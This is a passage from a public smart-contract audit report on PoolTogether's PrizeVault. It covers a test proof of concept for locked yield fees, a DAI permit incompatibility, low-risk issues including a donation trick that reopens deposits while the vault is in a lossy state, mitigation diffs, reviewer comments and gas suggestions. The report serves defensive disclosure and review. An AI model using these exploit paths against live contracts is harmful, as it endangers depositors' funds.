        vault.deposit(amount, account);
        vm.stopPrank();
    }

    function testMaxDeposit_CalculatesWithoutTakingIntoAccountGeneratedFees() public {
        vault.setYieldFeePercentage(1e8); // 10%
        vault.setYieldFeeRecipient(bob);

        // alice make initial deposit
        _deposit(alice, 1e18);

        // mint yield to the vault and liquidate
        underlyingAsset.mint(address(vault), 1e18);
        vault.setLiquidationPair(address(this));
        uint256 maxLiquidation = vault.liquidatableBalanceOf(address(underlyingAsset));
        uint256 amountOut = maxLiquidation / 2;
        uint256 yieldFee = (1e18 - vault.yieldBuffer()) / (2 * 10); // 10% yield fee + 90% amountOut = 100%

        // bob transfers tokens out and increase fee
        vault.transferTokensOut(address(0), bob, address(underlyingAsset), amountOut);

        // alice make deposit with maximum available value for deposit
        uint256 maxDeposit = vault.maxDeposit(address(this));
        _deposit(alice, maxDeposit);

        // then bob want to withdraw earned fee but he can't do that
        vm.prank(bob);
        vm.expectRevert();
        vault.claimYieldFeeShares(yieldFee);
    }
```

### Recommended Mitigation Steps

Add function to withdraw fees in `asset` or change function `PrizeVault.maxDeposit()` to calculate max deposit with taking into account produced fees:

```diff
    function maxDeposit(address) public view returns (uint256) {
        uint256 _totalSupply = totalSupply();
        uint256 totalDebt_ = _totalDebt(_totalSupply);
        if (totalAssets() < totalDebt_) return 0;

        // the vault will never mint more than 1 share per asset, so no need to convert supply limit to assets
        uint256 twabSupplyLimit_ = _twabSupplyLimit(_totalSupply);
        uint256 _maxDeposit;
        uint256 _latentBalance = _asset.balanceOf(address(this));
        uint256 _maxYieldVaultDeposit = yieldVault.maxDeposit(address(this));
        if (_latentBalance >= _maxYieldVaultDeposit) {
            return 0;
        } else {
            unchecked {
                _maxDeposit = _maxYieldVaultDeposit - _latentBalance;
            }
-           return twabSupplyLimit_ < _maxDeposit ? twabSupplyLimit_ : _maxDeposit;
+           return twabSupplyLimit_ < _maxDeposit ? twabSupplyLimit_ - yieldFeeBalance : _maxDeposit - yieldFeeBalance;
        }
    }
```

### Assessed type

Math

**[trmid (PoolTogether) confirmed and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/91#issuecomment-2004124563):**
 > The TWAB max supply limit is a known issue with the prize vault and the deployer is expected to evaluate the possibility of the limit being exceeded before deploying a new prize vault. This issue has demonstrated that any yield fees accrued in this state may end up locked in the prize vault until enough withdrawals occur to free up the TWAB supply limit. This is undesirable behaviour, since all funds that have entered the prize vault through deposits or yield should be able to be taken out in these unexpected circumstances.
>
> Mitigation [here](https://github.com/GenerationSoftware/pt-v5-vault/pull/93).

***

## [[M-08] Permit doesn't work with DAI](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/51)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/51), also found by [0xabhay](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/290), [Timenov](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/47), and [Omik](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/17)*

The function `depositWithPermit` in the `PrizeVault.sol` contract is used with permit options so that users can submit a signed message. They then can use that to give allowance to the contract to extract the tokens required for the deposit.

```solidity
IERC20Permit(address(_asset)).permit(_owner, address(this), _assets, _deadline, _v, _r, _s);
```

The issue is that the test suite shows that the protocol aims to use sDAI, the dai savings rate, but the DAI token's permit signature is different. From the contract at address `0x6B175474E89094C44Da98b954EedeAC495271d0F`, we see the `permit` function:

```solidity
function permit(address holder, address spender, uint256 nonce, uint256 expiry,
                    bool allowed, uint8 v, bytes32 r, bytes32 s) external
```

Due to the missing `nonce` field, DAI, a token which allows permit based interactions, cannot be used with signed messages for depositing into sDAI vaults. Due to the wrong parameters, the permit transactions will revert.

### Proof of Concept

It is evident from the code that the permit function call does not match the signature of DAI's permit function.

### Recommended Mitigation Steps

For the special case of DAI token, allow a different implementation of the permit function which allows a nonce variable.

### Assessed type

Token-Transfer

**[trmid (PoolTogether) acknowledged and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/51#issuecomment-1997937605):**
 > This is indeed a valuable insight and issue to be acknowledged, but no mitigation will be applied since the `depositWithPermit` function is meant as a quality of life improvement for depositors and adding additional logic to it's operation could introduce unexpected vulnerabilities.

**[Infect3d (warden) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/51#issuecomment-2004861780):**
 > @hansfriese, I think this submission should be considered as QA. A [`deposit` function](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L475) is made available, meaning there is still a possibility for users to deposit DAI (requiring them to approve first manually, which can be managed by the front-end UX as in most dApps already).
 >
> Based on the C4 severity categorization, a medium severity require either a loss of funds, or to impact the availability of the protocol, which is not the case thanks to the simple deposit.

**[hansfriese (judge) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/51#issuecomment-2009621603):**
 > `2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.`
> 
> While `deposit()` can be used instead of `depositWithPermit()`, I still believe Medium is eligible due to the potential dysfunctionality of the primary function.
> 

***

# Low Risk and Non-Critical Issues

For this audit, 7 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/212) by **0xmystery** received the top score from the judge.

*The following wardens also submitted reports: [d3e4](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/333), [slvDev](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/237), [Al-Qa-qa](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/346), [Tripathi](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/250), [ZanyBonzy](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/110), and [dvrkzy](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/53).*

## [01] `PrizeVault._tryGetAssetDecimals()` may return erroneous decimals

Some ERC20 assets do not have `decimals()` implemented. As such, when calling `PrizeVault._tryGetAssetDecimals()`, `success == false` when returned by `staticcall()` and `_tryGetAssetDecimals()` returns (false, 0):  

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L772-L783

```solidity
    function _tryGetAssetDecimals(IERC20 asset_) internal view returns (bool, uint8) {
        (bool success, bytes memory encodedDecimals) = address(asset_).staticcall(
            abi.encodeWithSelector(IERC20Metadata.decimals.selector)
        );
        if (success && encodedDecimals.length >= 32) {
            uint256 returnedDecimals = abi.decode(encodedDecimals, (uint256));
            if (returnedDecimals <= type(uint8).max) {
                return (true, uint8(returnedDecimals));
            }
        }
        return (false, 0);
    }
```

According to the logic implemented in the constructor, `_underlyingDecimals` would default to 18:

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L303-L305

```solidity
        IERC20 asset_ = IERC20(yieldVault_.asset());
        (bool success, uint8 assetDecimals) = _tryGetAssetDecimals(asset_);
        _underlyingDecimals = success ? assetDecimals : 18;
```

This can lead to significant discrepancy if the non-standard asset decimals is different than 18. It can affect various contract functionalities, such as asset calculations and distributions, especially for tokens with non-standard decimal values when accessing `PrizeVault.decimals()`:

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L320-L322

```solidity
    function decimals() public view override(ERC20, IERC20Metadata) returns (uint8) {
        return _underlyingDecimals;
    }
```

To mitigate this, contracts should be designed with mechanisms to accurately determine and use the correct decimal value; either by requiring decimal specification upon initialization, implementing fallback mechanisms with predefined mappings, or including validation checks to ensure compatibility and accuracy in token-related operations. Addressing this challenge is crucial for maintaining the reliability and fairness of smart contract transactions involving a diverse range of ERC20 tokens. 

## [02] Streamlining token approvals in `PrizeVault._depositAndMint()` with `forceApprove()`

Incorporating `forceApprove()`, such as in `PrizeVault._depositAndMint()`, could offer a more streamlined approach to managing ERC20 token allowances; particularly in complex interactions involving asset transfers to yield vaults. By enabling the contract to set precise allowances in a single step, this method could eliminate the need for conditional checks and subsequent resetting of allowances, thus simplifying the logic and potentially enhancing contract efficiency. 

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L860-L872

```diff
        // Previously accumulated dust is swept into the yield vault along with the deposit.
        uint256 _assetsWithDust = _asset.balanceOf(address(this));
-        _asset.approve(address(yieldVault), _assetsWithDust);
+        _asset.forceApprove(address(yieldVault), _assetsWithDust);

        // The shares are calculated and then minted directly to mitigate rounding error loss.
        uint256 _yieldVaultShares = yieldVault.previewDeposit(_assetsWithDust);
        uint256 _assetsUsed = yieldVault.mint(_yieldVaultShares, address(this));
-        if (_assetsUsed != _assetsWithDust) {
-            // If some latent balance remains, the approval is set back to zero for weird tokens like USDT.
-            _asset.approve(address(yieldVault), 0);
-        }

        _mint(_receiver, _shares);
```

## [03] Simplifying yield fee distribution through direct transfers

Adopting a direct transfer approach via [`_withdraw()`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L939) for handling `_yieldFee` payments to the `_yieldFeeRecipient`, as opposed to minting and claiming fee shares late via `claimYieldFeeShares()`, presents a streamlined method that enhances operational efficiency and transparency.

This strategy effectively circumvents the complexities and potential issues associated with share-based fee claims, particularly in [nuanced scenarios such as lossy states](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L619) of the contract. Additionally, it eradicates the risk of losing the remainder if `yieldFeeBalance` [isn't fully claimed and minted](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L617). While direct transfers ensure immediate fee settlement and avoid the intricacies of share management, it's imperative to assess the implications on the contract's economic dynamics, potential increase in transaction costs, and the overarching security framework. A careful consideration and robust implementation of this approach can significantly contribute to the clarity and efficacy of fee handling mechanisms in decentralized finance applications, ensuring alignment with the contract's broader economic and operational goals.

## [04] Enhancing liquidation efficiency with dynamic adjustment

Integrating a dynamic adjustment feature within the `transferTokensOut` function of PrizeVault.sol offers a robust solution to gracefully handle concurrent liquidations, significantly reducing the risk of transaction reverts:

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L678-L681

```solidity
        // Ensure total liquidation amount does not exceed the available yield balance:
        if (_amountOut + _yieldFee > _availableYield) {
            revert LiquidationExceedsAvailable(_amountOut + _yieldFee, _availableYield);
        }
```

Due to fluctuating available yield balances:

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L653

```solidity
        return _liquidYield >= _maxAmountOut ? _maxAmountOut : _liquidYield;
```

This approach ensures that liquidation amounts are adjusted in real-time based on the latest `liquidatableBalanceOf`; thereby, maintaining operational continuity and fairness among transactions, even in the face of potential frontrunning or high transaction volumes.

## [05] Adapting PrizeVault to L2's decentralized sequencing: Navigating new frontiers in transaction fairness

As Layer 2, like Arbitrum or Base, considers moving towards a more decentralized sequencer model, the platform faces the challenge of maintaining its current mitigation of frontrunning risks inherent in a "first come, first served" system.

The transition could reintroduce vulnerabilities to transaction ordering manipulation, demanding innovative solutions to uphold transaction fairness. Strategies such as commit-reveal schemes, submarine sends, Fair Sequencing Services (FSS), decentralized MEV mitigation techniques, and the incorporation of time-locks and randomness could play pivotal roles. These measures aim to preserve the integrity of transaction sequencing, ensuring that the L2's evolution towards decentralization enhances its ecosystem without compromising the security and fairness that are crucial for user trust and platform reliability.

## [06] Enhancing contract efficiency with proactive financial health checks in `PrizeVault._depositAndMint()`

Incorporating early financial health checks within the PrizeVault contract's `_depositAndMint` function can significantly enhance operational efficiency and user experience by preemptively identifying a lossy state before executing any substantive contract actions. This proactive approach could avoid doomed transactions and reinforce the contract's integrity by ensuring that operations do not proceed under financially compromised conditions.

While such early checks offer a clear benefit in terms of transaction efficiency and security, the dynamic nature of smart contract states necessitates a careful balance, possibly retaining end-of-operation validations to accommodate any changes occurring during transaction execution. This dual-check strategy ensures the PrizeVault remains responsive and reliable, even as it navigates the complexities of dynamic financial states within decentralized finance environments.

Here's the instance entailed that appears at the end of the call logic:

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L874

```solidity
        if (totalAssets() < totalDebt()) revert LossyDeposit(totalAssets(), totalDebt()); 
```

## [07] Implementing dynamic adjustments for enhanced transaction reliability when depositing/withdrawing

Incorporating dynamic adjustments within the PrizeVault contract's [`deposit`, `mint`, `withdraw`, and `redeem` functions](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L474-L565) can significantly bolster transaction reliability and user experience by adapting to real-time changes in available assets or shares. Given the inherent variability of transaction execution times on the blockchain, which can lead to discrepancies between pre-checked limits (as ultimately determined by [`maxDeposit`, `maxMint`, `maxWithdraw`, and `maxRedeem`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L368-L438)) and the contract's state at execution, integrating such adjustments ensures that transactions proceed smoothly without unnecessary reverts, even under fluctuating conditions.

This approach not only enhances the contract's responsiveness to network dynamics but also aligns with user expectations for a seamless and efficient interaction with the contract, reinforcing trust and satisfaction within the platform.

## [08] Private function with embedded modifier reduces contract size

Consider having the logic of a modifier embedded through a private function to reduce contract size if need be. A `private` visibility that is more efficient on function calls than the `internal` visibility is adopted because the modifier will only be making this call inside the contract.

For instance, the modifier below may be refactored as follows:

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L260-L265

```diff
+    function _onlyLiquidationPair() private view {
+        if (msg.sender != liquidationPair) {
+           revert CallerNotLP(msg.sender, liquidationPair);
+        }
+    }

     modifier onlyLiquidationPair() {
-        if (msg.sender != liquidationPair) {
-           revert CallerNotLP(msg.sender, liquidationPair);
-        }
+        _onlyLiquidationPair();
     _;
     }
```

## [09] Activate the Optimizer

Before deploying your contract, activate the optimizer when compiling using “solc --optimize --bin sourceFile.sol”. By default, the optimizer will optimize the contract assuming it is called 200 times across its lifetime. If you want the initial contract deployment to be cheaper and the later function executions to be more expensive, set it to “ --optimize-runs=1”. Conversely, if you expect many transactions and do not care for higher deployment cost and output size, set “--optimize-runs” to a high number.

```
module.exports = {
solidity: {
version: "0.8.24",
settings: {
optimizer: {
  enabled: true,
  runs: 1000,
},
},
},
};
```

Please visit [this site](https://docs.soliditylang.org/en/v0.5.4/using-the-compiler.html#using-the-commandline-compiler) for further information:

Here's one example of instance on opcode comparison that delineates the gas saving mechanism:

```
for !=0 before optimization
PUSH1 0x00
DUP2
EQ
ISZERO
PUSH1 [cont offset]
JUMPI

after optimization
DUP1
PUSH1 [revert offset]
JUMPI
```

Disclaimer: There have been several bugs with security implications related to optimizations. For this reason, Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past.

A high-severity bug in the `emscripten -generated solc-js` compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. Please measure the gas savings from optimizations, and carefully weigh them against the possibility of an optimization-related bug. Also, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.

**[trmid (PoolTogether) confirmed and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/212#issuecomment-2000425756):**
 > [02] mitigation [here](https://github.com/GenerationSoftware/pt-v5-vault/pull/87).

**[hansfriese (judge) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/212#issuecomment-2003828925):**
> [01] - Low<br>
> [02] - Low<br>
> [03] - Low<br>
> [04] - Low<br>
> [05] - Non-Critical<br>
> [06] - Low<br>
> [07] - Low<br>
> [08] - Non-Critical<br>
> [09] - Non-Critical<br>
> 6 Low, 3 Non-Critical and 2 downgraded QAs

## [[10] Exploitation of yield buffer depletion to gain unfair advantage in prize competitions via asset donation](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/209)

*Note: At the judge’s request [here](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/212#issuecomment-2003828925), this downgraded issue from the same warden has been included in this report for completeness.*

The depletion of the yield buffer in the `PrizeVault` contract, leading to a state where `(_totalAssets < totalDebt_)` is short by a relatively insignificant figure that could be even larger than [1e5](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L63). This presents a vulnerability that could be exploited by savvy users to gain an unfair advantage in prize competitions.

In this scenario, the contract's logic prevents new deposits due to the lack of a yield buffer, intended to ensure the "no loss" principle for all depositors. However, a user could circumvent this safeguard by donating a minimal amount (e.g. 1 wei to any amount worth the venture) of assets to the contract, just enough to re-enable deposits. This action could allow the user to make a substantial new deposit, disproportionately increasing their share and, consequently, their chance of winning an impending grand prize, at minimal cost. This is particularly crucial when the yield vault is going to unexpectedly stop generating yield for quite a while.  

### Proof of Concept

Consider the following steps for exploitation:

1. The contract is in a state where `_totalAssets < totalDebt_`, and new deposits are blocked.

    https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L874

```solidity
        if (totalAssets() < totalDebt()) revert LossyDeposit(totalAssets(), totalDebt());
```
2. A user donates an amount of the underlying asset to the contract, incrementing `_totalAssets` just enough for the contract to accept new deposits.
3. The user then makes a large [deposit](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L475-L479), significantly increasing their time-weighted average balance and their chances of winning upcoming prizes, without contributing proportionately to the yield buffer's replenishment.

This strategy could be particularly appealing if the timing aligns with the accumulation of a substantial prize, allowing the user to maximize the odds of prize winning with minimal additional contribution to the prize vault.

### Recommended Mitigation Steps

I suggest a bot be set up for the prize vault owner to auto replenish the yield buffer when `_totalAssets < totalDebt_ - 1` or nearing this condition jointly assisted/alerted by the emitted deposit event.

### Assessed type

Timing

**[trmid (PoolTogether) acknowledged and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/209#issuecomment-1995986800):**
 > It's true that someone could donate some assets to the prize vault while it's in a lossy state to sneak their deposit in, but it's unlikely for this to result in any sort of advantage for them since the vault is only in that state if it's not generating yield; which means that it's not contributing anything to the prize pool and therefore not generating any new prize chance.
> 
> All things considered, this behavior can be viewed as a net positive for the prize vault since a donation is being made to a struggling prize vault at no cost to the other depositors.

**[hansfriese (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/209#issuecomment-2002750564):**
> As the sponsor has mentioned, it doesn't help the prize pool generate any new prize chances. So the benefit is just to get a higher share inside the `prizeVault`, and it would take a certain time to increase his time-weighted balance. It means other users would be able to deposit in the meantime if they are interested after the attacker's donation.
> 
> For the above reasons, QA is more appropriate.

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/209).*

## [[11] Inconsistent asset-debt validation in `PrizeVault.claimYieldFeeShares()`](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/157)

*Note: At the judge’s request [here](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/212#issuecomment-2003828925), this downgraded issue from the same warden has been included in this report for completeness.*

The inconsistency in asset-debt validation between the `_depositAndMint` and `claimYieldFeeShares` functions can lead to an aggravation of the contract's lossy state. Specifically, the `_depositAndMint` function includes a safeguard to prevent minting shares that would further cause the total assets managed by the contract to be less than the total debt owed to shareholders. 

However, the `claimYieldFeeShares` function lacks a similar check when minting shares for the yield fee recipient. This omission means that in scenarios where the contract is already in a lossy state (i.e., `totalAssets() < totalDebt()`), calling `claimYieldFeeShares` could exacerbate this condition by increasing the total debt without adding any new assets to the contract. This could lead to a situation where users withdrawing their shares receive even fewer assets than expected, deepening the lossy state and potentially leading to further financial discrepancies on existing users who have deposited their assets.

### Proof of Concept

In the `_depositAndMint` function, the contract includes a safety check before minting new shares to ensure that the total assets after the operation are not any further less than the total debt, as shown below:

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L874

```solidity
        if (totalAssets() < totalDebt()) revert LossyDeposit(totalAssets(), totalDebt());
```
However, in the `claimYieldFeeShares` function, shares are minted for the yield fee recipient without a corresponding check to ensure that this operation does not exacerbate a lossy state:

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L611-L622

```solidity
    function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {
        if (_shares == 0) revert MintZeroShares();

        uint256 _yieldFeeBalance = yieldFeeBalance;
        if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);

        yieldFeeBalance -= _yieldFeeBalance;

        _mint(msg.sender, _shares); // @audit

        emit ClaimYieldFeeShares(msg.sender, _shares);
    }
```

This discrepancy in the validation logic can lead to situations where minting shares via `claimYieldFeeShares` decreases the asset-to-share ratio further, affecting all shareholders negatively.

https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L465

```solidity
            return _assets.mulDiv(totalDebt_, _totalAssets, Math.Rounding.Up);
```
https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L364

```solidity
            return _shares.mulDiv(_totalAssets, totalDebt_, Math.Rounding.Down);
```

### Recommended Mitigation Steps

To mitigate the potential risks associated with this inconsistency, it is recommended to introduce similar asset-debt validation in the `claimYieldFeeShares` function as is present in the `_depositAndMint` function. Ideally, before minting shares in `claimYieldFeeShares`, the contract should also check that this operation will not result in `totalAssets() < totalDebt()`. If such a situation would occur, the transaction should revert to prevent exacerbating or leading to the lossy state.

### Assessed type

Invalid Validation

***

# Gas Optimizations

For this audit, 10 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/236) by **slvDev** received the top score from the judge.

*The following wardens also submitted reports: [0x11singh99](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/326), [albahaca](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/317), [shamsulhaq123](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/273), [0xhacksmithh](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/352), [hunter\_w3b](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/316), [dharma09](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/306), [SAQ](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/303), [unique](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/215), and [SY\_S](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/93).*

## Gas Findings Summary

| ID | Issue | Instances | Total Gas Saved |
|----|-------|:---------:|:---------:|
| [G&#8209;01] | Use `assembly` for efficient event emission | 14 | 5320 |
| [G&#8209;02] | Enable IR-based code generation | 6 | - |
| [G&#8209;03] | Use `immutable`s variables directly, instead of cache them in stack | 2 | 0 |
| [G&#8209;04] | Assembly: Check `msg.sender` using xor and the scratch space | 4 | 84 |
| [G&#8209;05] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct` | 2 | - |
| [G&#8209;06] | Assembly: Use scratch space when building emitted events with two data arguments | 3 | 45 |
| [G&#8209;07] | Stack variable is only used once | 4 | 12 |
| [G&#8209;08] | `abi.encodePacked `is more gas efficient than `abi.encode` | 1 | 200 |
| [G&#8209;09] | Use `assembly` to write mutable storage values | 6 | 66 |
| [G&#8209;10] | Use `revert()` to gain maximum gas savings | 24 | 1200 |
| [G&#8209;11] | `>=` costs less gas than `>` | 1 | 6 |
| [G&#8209;12] | Consider pre-calculating the address of `address(this)` to save gas | 25 | 0 |
| [G&#8209;13] | Call `msg.sender` directly instead of caching it | 1 | 14 |
| [G&#8209;14] | Use `unchecked` for Non-Loop Increment/Decrement operations | 1 | 30 |
| [G&#8209;15] | Constructors can be marked `payable` | 3 | 72 |
| [G&#8209;16] | Reduce gas usage by moving to Solidity 0.8.19 or later | 1 | - |
| [G&#8209;17] | Reduce deployment costs by tweaking contracts' metadata | 6 | 63600 |
| [G&#8209;18] | Use Pre-Increment/Decrement (`++i/--i`) to Save Gas | 1 | 5 |
| [G&#8209;19] | Nesting `if`-statements is cheaper than using `&&` | 1 | 6 |
| [G&#8209;20] | Avoid transferring amounts of zero in order to save gas | 1 | 200 |
| [G&#8209;21] | `>=` costs less gas than `>` | 6 | 18 |
| [G&#8209;22] | Use `unchecked` for math operations if they already checked | 5 | 425 |
| [G&#8209;23] | Using `private` rather than `public`, saves gas | 16 | 352000 |
| [G&#8209;24] | Use Assembly for hash calculations | 1 | 1005 |
| [G&#8209;25] | Refactor duplicated `require()`/`revert()` checks to save gas | 2 | - |
| [G&#8209;26] | Use Assembly for efficient memory management in multiple external calls | 10 | 26000 |
| [G&#8209;27] | Cached global variables | 1 | 12 |
| [G&#8209;28] | Simple checks for zero `uint` can be done using `assembly` to save gas | 8 | 32 |
| [G&#8209;29] | Consider using solady's `FixedPointMathLib` | 1 | - |
| [G&#8209;30] | Avoid zero to non-zero storage writes where possible | 2 | 44200 |
| [G&#8209;31] | Use `unchecked` for division which do not divide by `-X` since they can't overflow | 1 | 20 |
| [G&#8209;32] | Use solady library where possible to save gas | 6 | 8000 |
| [G&#8209;33] | Use `uint256(1)`/`uint256(2)` instead of `true`/`false` to save gas for changes | 1 | 17000 |
| [G&#8209;34] | Mark functions that revert for normal users as `payable` | 8 | 168 |
| [G&#8209;35] | Prefer `private` over `public` for constants to save gas | 4 | 12000 |
| [G&#8209;36] | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 2 | 226 |
| [G&#8209;37] | Using `bool`s for storage incurs overhead | 1 | 100 |
| [G&#8209;38] | Optimize gas by using only named returns | 40 | 1760 |
| [G&#8209;39] | Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead | 19 | 114 |
| [G&#8209;40] | Use assembly to check for `address(0)` | 7 | 406 |
| [G&#8209;41] | `internal`/`private` functions only called once can be inlined to save gas | 2 | 40 |
| [G&#8209;42] | Declare `immutable` as `private` to save gas | 4 | 12000 |
| [G&#8209;43] | Optimize names to save gas | 5 | 100 |
| [G&#8209;44] | Avoid updating storage when the value hasn't changed | 7 | 5600 |
| [G&#8209;45] | Optimize external calls with Assembly for memory efficiency | 24 | 5280 |

Total: 290 instances of 45 issues with 557366 gas saved.

## [G-01] Use `assembly` for efficient event emission

To efficiently emit events, consider utilizing assembly by making use of scratch space and the free memory pointer. This approach can potentially avoid the costs associated with memory expansion.

However, it's crucial to cache and restore the free memory pointer for safe optimization.
Good examples of such practices can be found in well-optimized [Solady's codebases](https://github.com/Vectorized/solady/blob/main/src/tokens/ERC1155.sol#L167).
Please review your code and consider the potential gas savings of this approach.

14 issue instances in 5 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
562: emit Sponsor(_owner, _assets, _shares)
621: emit ClaimYieldFeeShares(msg.sender, _shares)
697: emit TransferYieldOut(msg.sender, _tokenOut, _receiver, _amountOut, _yieldFee)
747: emit LiquidationPairSet(address(this), address(_liquidationPair))
876: emit Deposit(_caller, _receiver, _assets, _shares)
909: emit Withdraw(_caller, _receiver, _owner, _assets, _shares)
952: emit YieldFeePercentageSet(_yieldFeePercentage)
960: emit YieldFeeRecipientSet(_yieldFeeRecipient)
```

[562](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L562) | [621](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L621) | [697](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L697) | [747](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L747) | [876](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L876) | [909](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L909) | [952](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L952) | [960](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L960)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
123: emit NewPrizeVault(
            _vault,
            _yieldVault,
            _prizePool,
            _name,
            _symbol
        )
```

[123](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L123)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
78: emit Transfer(address(0), _receiver, _amount)
89: emit Transfer(_owner, address(0), _amount)
102: emit Transfer(_from, _to, _amount)
```

[78](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L78) | [89](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L89) | [102](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L102)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
131: emit ClaimerSet(_claimer)
```

[131](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L131)

```solidity
File: pt-v5-vault/src/abstract/HookManager.sol
31: emit SetHooks(msg.sender, hooks)
```

[31](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/HookManager.sol#L31)

</details>

## [G-02] Enable IR-based code generation

The `--via-ir` command line option activates the IR-based code generator in Solidity, which is designed to enable powerful optimization passes that can span across functions. The end result may be a contract that requires less gas to execute its functions.

We recommend you enable this feature, run tests, and benchmark the gas usage of your contract to evaluate if it leads to any tangible gas savings. Experimenting with this feature could lead to a more gas-efficient contract.

